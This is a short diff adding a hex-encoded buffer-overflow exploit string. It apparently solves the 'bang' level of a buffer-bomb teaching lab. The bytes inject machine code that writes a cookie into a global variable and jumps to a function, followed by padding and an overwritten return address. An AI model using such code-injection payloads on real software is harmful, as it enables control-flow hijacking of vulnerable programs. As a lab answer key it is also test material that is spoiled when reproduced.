@@ -1,0 +1,9 @@
+c7 05 24 d1 04 08 /* store cookie in gloval_value */
+35 79 af 32 /* my cookie */
+68 72 8e 04 08 /* push address of bang onto stack */
+c3 /* return */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 /* padding to reach return address */
+88 3d 68 55
